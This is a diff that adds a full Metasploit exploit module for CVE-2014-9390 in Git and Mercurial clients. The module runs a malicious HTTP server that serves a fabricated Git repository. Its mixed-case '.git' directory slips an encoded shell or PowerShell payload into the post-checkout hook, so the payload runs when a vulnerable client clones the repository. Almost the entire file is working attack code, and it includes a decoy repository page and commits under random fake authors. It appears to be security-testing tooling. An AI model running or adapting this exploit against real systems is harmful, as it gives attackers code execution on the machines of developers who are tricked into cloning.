@@ -1,0 +1,378 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name' => 'Malicious Git and Mercurial HTTP Server For CVE-2014-9390',
+      'Description' => %q(
+        This module exploits CVE-2014-9390, which affects Git (versions less
+        than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial (versions
+        less than 3.2.3) and describes three vulnerabilities.
+
+        On operating systems which have case-insensitive file systems, like
+        Windows and OS X, Git clients can be convinced to retrieve and
+        overwrite sensitive configuration files in the .git
+        directory which can allow arbitrary code execution if a vulnerable
+        client can be convinced to perform certain actions (for example,
+        a checkout) against a malicious Git repository.
+
+        A second vulnerability with similar characteristics also exists in both
+        Git and Mercurial clients, on HFS+ file systems (Mac OS X) only, where
+        certain Unicode codepoints are ignorable.
+
+        The third vulnerability with similar characteristics only affects
+        Mercurial clients on Windows, where Windows "short names"
+        (MS-DOS-compatible 8.3 format) are supported.
+
+        Today this module only truly supports the first vulnerability (Git
+        clients on case-insensitive file systems) but has the functionality to
+        support the remaining two with a little work.
+      ),
+      'License' => MSF_LICENSE,
+      'Author' => [
+        'Jon Hart <jon_hart[at]rapid7.com>' # metasploit module
+      ],
+      'References'     =>
+        [
+          ['CVE', '2014-9390'],
+          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial'],
+          ['URL', 'http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html'],
+          ['URL', 'http://article.gmane.org/gmane.linux.kernel/1853266'],
+          ['URL', 'https://github.com/blog/1938-vulnerability-announced-update-your-git-clients'],
+          ['URL', 'https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/'],
+          ['URL', 'http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29'],
+          ['URL', 'http://selenic.com/repo/hg-stable/rev/c02a05cc6f5e'],
+          ['URL', 'http://selenic.com/repo/hg-stable/rev/6dad422ecc5a']
+
+        ],
+      'DisclosureDate' => 'Dec 18 2014',
+      'Targets' =>
+        [
+          [
+            'Automatic',
+            {
+              'Platform' => [ 'unix' ],
+              'Arch'     => ARCH_CMD,
+              'Payload'        =>
+                {
+                  'Compat'      =>
+                    {
+                      'PayloadType' => 'cmd cmd_bash',
+                      'RequiredCmd' => 'generic bash-tcp perl'
+                    }
+                }
+            }
+          ],
+          [
+            'Windows Powershell',
+            {
+              'Platform' => [ 'windows' ],
+              'Arch'     => [ARCH_X86, ARCH_X86_64]
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptBool.new('GIT', [true, 'Exploit Git clients', true])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptString.new('GIT_URI', [false, 'The URI to use as the malicious Git instance (empty for random)', '']),
+        OptString.new('MERCURIAL_URI', [false, 'The URI to use as the malicious Mercurial instance (empty for random)', '']),
+        OptString.new('GIT_HOOK', [false, 'The Git hook to use for exploitation', 'post-checkout']),
+        OptString.new('MERCURIAL_HOOK', [false, 'The Mercurial hook to use for exploitation', 'update']),
+        OptBool.new('MERCURIAL', [false, 'Enable experimental Mercurial support', false])
+      ]
+    )
+  end
+
+  def setup
+    # the exploit requires that we act enough like a real Mercurial HTTP instance,
+    # so we keep a mapping of all of the files and the corresponding data we'll
+    # send back along with a trigger file that signifies that the git/mercurial
+    # client has fetched the malicious content.
+    @repo_data = {
+      git: { files: {}, trigger: nil },
+      mercurial: { files: {}, trigger: nil }
+    }
+
+    unless datastore['GIT'] || datastore['MERCURIAL']
+      fail_with(Failure::BadConfig, 'Must specify at least one GIT and/or MERCURIAL')
+    end
+
+    setup_git
+    setup_mercurial
+
+    super
+  end
+
+  def setup_git
+    return unless datastore['GIT']
+    # URI must start with a /
+    unless git_uri && git_uri =~ /^\//
+      fail_with(Failure::BadConfig, 'GIT_URI must start with a /')
+    end
+    # sanity check the malicious hook:
+    if datastore['GIT_HOOK'].blank?
+      fail_with(Failure::BadConfig, 'GIT_HOOK must not be blank')
+    end
+
+    # In .git/hooks/ directory, specially named files are shell scripts that
+    # are executed when particular events occur.  For example, if
+    # .git/hooks/post-checkout was an executable shell script, a git client
+    # would execute that file every time anything is checked out.  There are
+    # various other files that can be used to achieve similar goals but related
+    # to committing, updating, etc.
+    #
+    # This vulnerability allows a specially crafted file to bypass Git's
+    # blacklist and overwrite the sensitive .git/hooks/ files which can allow
+    # arbitrary code execution if a vulnerable Git client can be convinced to
+    # interact with a malicious Git repository.
+    #
+    # This builds a fake git repository using the knowledge from:
+    #
+    #   http://schacon.github.io/gitbook/7_how_git_stores_objects.html
+    #   http://schacon.github.io/gitbook/7_browsing_git_objects.html
+    case target.name
+    when 'Automatic'
+      full_cmd = "#!/bin/sh\n#{payload.encoded}\n"
+    when 'Windows Powershell'
+      psh = cmd_psh_payload(payload.encoded,
+                            payload_instance.arch.first,
+                            remove_comspec: true,
+                            encode_final_payload: true)
+      full_cmd = "#!/bin/sh\n#{psh}"
+    end
+
+    sha1, content = build_object('blob', full_cmd)
+    trigger = "/objects/#{get_path(sha1)}"
+    @repo_data[:git][:trigger] = trigger
+    @repo_data[:git][:files][trigger] = content
+    # build tree that points to the blob
+    sha1, content = build_object('tree', "100755 #{datastore['GIT_HOOK']}\0#{[sha1].pack('H*')}")
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+    # build a tree that points to the hooks directory in which the hook lives, called hooks
+    sha1, content = build_object('tree', "40000 hooks\0#{[sha1].pack('H*')}")
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+    # build a tree that points to the partially uppercased .git directory in
+    # which hooks live
+    variants = []
+    %w(g G). each do |g|
+      %w(i I).each do |i|
+        %w(t T).each do |t|
+          git = g + i + t
+          variants << git unless git.chars.none? { |c| c == c.upcase }
+        end
+      end
+    end
+    git_dir = '.' + variants.sample
+    sha1, content = build_object('tree', "40000 #{git_dir}\0#{[sha1].pack('H*')}")
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+    # build the supposed commit that dropped this file, which has a random user/company
+    email = Rex::Text.rand_mail_address
+    first, last, company = email.scan(/([^\.]+)\.([^\.]+)@(.*)$/).flatten
+    full_name = "#{first.capitalize} #{last.capitalize}"
+    tstamp = Time.now.to_i
+    author_time = rand(tstamp)
+    commit_time = rand(author_time)
+    tz_off = rand(10)
+    commit = "author #{full_name} <#{email}> #{author_time} -0#{tz_off}00\n" \
+             "committer #{full_name} <#{email}> #{commit_time} -0#{tz_off}00\n" \
+             "\n" \
+             "Initial commit to open git repository for #{company}!\n"
+    if datastore['VERBOSE']
+      vprint_status("Malicious Git commit of #{git_dir}/#{datastore['GIT_HOOK']} is:")
+      commit.each_line { |l| vprint_status(l.strip) }
+    end
+    sha1, content = build_object('commit', "tree #{sha1}\n#{commit}")
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+    # build HEAD
+    @repo_data[:git][:files]['/HEAD'] = "ref: refs/heads/master\n"
+    # lastly, build refs
+    @repo_data[:git][:files]['/info/refs'] = "#{sha1}\trefs/heads/master\n"
+  end
+
+  def setup_mercurial
+    return unless datastore['MERCURIAL']
+    # URI must start with a /
+    unless mercurial_uri && mercurial_uri =~ /^\//
+      fail_with(Failure::BadConfig, 'MERCURIAL_URI must start with a /')
+    end
+    # sanity check the malicious hook
+    if datastore['MERCURIAL_HOOK'].blank?
+      fail_with(Failure::BadConfig, 'MERCURIAL_HOOK must not be blank')
+    end
+    # we fake the Mercurial HTTP protocol such that we are compliant as possible but
+    # also as simple as possible so that we don't have to support all of the protocol
+    # complexities.  Taken from:
+    #   http://mercurial.selenic.com/wiki/HttpCommandProtocol
+    #   http://selenic.com/hg/file/tip/mercurial/wireproto.py
+    @repo_data[:mercurial][:files]['?cmd=capabilities'] = 'heads getbundle=HG10UN'
+    fake_sha1 = 'e6c39c507d7079cfff4963a01ea3a195b855d814'
+    @repo_data[:mercurial][:files]['?cmd=heads'] = "#{fake_sha1}\n"
+    # TODO: properly bundle this using the information in http://mercurial.selenic.com/wiki/BundleFormat
+    @repo_data[:mercurial][:files]["?cmd=getbundle&common=#{'0' * 40}&heads=#{fake_sha1}"] = Zlib::Deflate.deflate("HG10UNfoofoofoo")
+
+    # TODO: finish building the fake repository
+  end
+
+  # Build's a Git object
+  def build_object(type, content)
+    # taken from http://schacon.github.io/gitbook/7_how_git_stores_objects.html
+    header = "#{type} #{content.size}\0"
+    store = header + content
+    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
+  end
+
+  # Returns the Git object path name that a file with the provided SHA1 will reside in
+  def get_path(sha1)
+    sha1[0...2] + '/' + sha1[2..40]
+  end
+
+  def exploit
+    super
+  end
+
+  def primer
+    # add the git and mercurial URIs as necessary
+    if datastore['GIT']
+      hardcoded_uripath(git_uri)
+      print_status("Malicious Git URI is #{URI.parse(get_uri).merge(git_uri)}")
+    end
+    if datastore['MERCURIAL']
+      hardcoded_uripath(mercurial_uri)
+      print_status("Malicious Mercurial URI is #{URI.parse(get_uri).merge(mercurial_uri)}")
+    end
+  end
+
+  # handles routing any request to the mock git, mercurial or simple HTML as necessary
+  def on_request_uri(cli, req)
+    # if the URI is one of our repositories and the user-agent is that of git/mercurial
+    # send back the appropriate data, otherwise just show the HTML version
+    if (user_agent = req.headers['User-Agent'])
+      if datastore['GIT'] && user_agent =~ /^git\// && req.uri.start_with?(git_uri)
+        do_git(cli, req)
+        return
+      elsif datastore['MERCURIAL'] && user_agent =~ /^mercurial\// && req.uri.start_with?(mercurial_uri)
+        do_mercurial(cli, req)
+        return
+      end
+    end
+
+    do_html(cli, req)
+  end
+
+  # simulates a Git HTTP server
+  def do_git(cli, req)
+    # determine if the requested file is something we know how to serve from our
+    # fake repository and send it if so
+    req_file = URI.parse(req.uri).path.gsub(/^#{git_uri}/, '')
+    if @repo_data[:git][:files].key?(req_file)
+      vprint_status("Sending Git #{req_file}")
+      send_response(cli, @repo_data[:git][:files][req_file])
+      if req_file == @repo_data[:git][:trigger]
+        vprint_status("Trigger!")
+        # Do we need this?  If so, how can I update the payload which is in a file which
+        # has already been built?
+        # regenerate_payload
+        handler(cli)
+      end
+    else
+      vprint_status("Git #{req_file} doesn't exist")
+      send_not_found(cli)
+    end
+  end
+
+  # simulates an HTTP server with simple HTML content that lists the fake
+  # repositories available for cloning
+  def do_html(cli, _req)
+    resp = create_response
+    resp.body = <<HTML
+     <html>
+      <head><title>Public Repositories</title></head>
+      <body>
+        <p>Here are our public repositories:</p>
+        <ul>
+HTML
+
+    if datastore['GIT']
+      this_git_uri = URI.parse(get_uri).merge(git_uri)
+      resp.body << "<li><a href=#{git_uri}>Git</a> (clone with `git clone #{this_git_uri}`)</li>"
+    else
+      resp.body << "<li><a>Git</a> (currently offline)</li>"
+    end
+
+    if datastore['MERCURIAL']
+      this_mercurial_uri = URI.parse(get_uri).merge(mercurial_uri)
+      resp.body << "<li><a href=#{mercurial_uri}>Mercurial</a> (clone with `hg clone #{this_mercurial_uri}`)</li>"
+    else
+      resp.body << "<li><a>Mercurial</a> (currently offline)</li>"
+    end
+    resp.body << <<HTML
+        </ul>
+      </body>
+    </html>
+HTML
+
+    cli.send_response(resp)
+  end
+
+  # simulates a Mercurial HTTP server
+  def do_mercurial(cli, req)
+    # determine if the requested file is something we know how to serve from our
+    # fake repository and send it if so
+    uri = URI.parse(req.uri)
+    req_path = uri.path
+    req_path += "?#{uri.query}" if uri.query
+    req_path.gsub!(/^#{mercurial_uri}/, '')
+    if @repo_data[:mercurial][:files].key?(req_path)
+      vprint_status("Sending Mercurial #{req_path}")
+      send_response(cli, @repo_data[:mercurial][:files][req_path], 'Content-Type' => 'application/mercurial-0.1')
+      if req_path == @repo_data[:mercurial][:trigger]
+        vprint_status("Trigger!")
+        # Do we need this?  If so, how can I update the payload which is in a file which
+        # has already been built?
+        # regenerate_payload
+        handler(cli)
+      end
+    else
+      vprint_status("Mercurial #{req_path} doesn't exist")
+      send_not_found(cli)
+    end
+  end
+
+  # Returns the value of GIT_URI if not blank, otherwise returns a random .git URI
+  def git_uri
+    return @git_uri if @git_uri
+    if datastore['GIT_URI'].blank?
+      @git_uri = '/' + Rex::Text.rand_text_alpha(rand(10) + 2).downcase + '.git'
+    else
+      @git_uri = datastore['GIT_URI']
+    end
+  end
+
+  # Returns the value of MERCURIAL_URI if not blank, otherwise returns a random URI
+  def mercurial_uri
+    return @mercurial_uri if @mercurial_uri
+    if datastore['MERCURIAL_URI'].blank?
+      @mercurial_uri = '/' + Rex::Text.rand_text_alpha(rand(10) + 6).downcase
+    else
+      @mercurial_uri = datastore['MERCURIAL_URI']
+    end
+  end
+end
